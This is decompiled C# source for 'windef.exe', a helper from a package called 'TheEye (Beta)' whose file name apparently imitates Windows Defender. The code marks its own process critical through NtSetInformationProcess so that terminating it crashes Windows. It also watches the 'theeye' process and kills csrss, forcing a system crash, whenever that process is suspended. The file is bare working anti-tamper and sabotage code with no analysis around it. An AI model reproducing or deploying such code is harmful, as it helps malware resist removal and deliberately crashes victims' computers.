// Decompiled with JetBrains decompiler
// Type: EyeShield.Program
// Assembly: windef, Version=6.1.6588.4589, Culture=neutral, PublicKeyToken=null
// MVID: D23E7A41-0614-49D4-A92C-108FD3ADE00E
// Assembly location: R:\WinBackup\Downloads\TheEye (Beta) [c0d9d by DesConnet](1)\src\Resources\windef.exe

using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Threading;

namespace EyeShield
{
  internal class Program
  {
    [DllImport("ntdll.dll", SetLastError = true)]
    private static extern int NtSetInformationProcess(
      IntPtr hProcess,
      int processInformationClass,
      ref int processInformation,
      int processInformationLength);

    private static void SetProcessIsCritical(int isCritical)
    {
      Process.EnterDebugMode();
      Program.NtSetInformationProcess(Process.GetCurrentProcess().Handle, 29, ref isCritical, 4);
    }

    private static void Main(string[] args)
    {
      Program.SetProcessIsCritical(1);
      ThreadPool.QueueUserWorkItem(new WaitCallback(Functions.CheckWindowTitle));
      ThreadPool.QueueUserWorkItem(new WaitCallback(Functions.StartupProtection));
      while (true)
      {
        Process[] processesByName = Process.GetProcessesByName("theeye");
        if (processesByName.Length != 0 && (processesByName[0].Threads[0].ThreadState != System.Diagnostics.ThreadState.Wait ? 0 : (processesByName[0].Threads[0].WaitReason == ThreadWaitReason.Suspended ? 1 : 0)) != 0)
          Process.GetProcessesByName("csrss")[0].Kill();
        Thread.Sleep(50);
      }
    }
  }
}
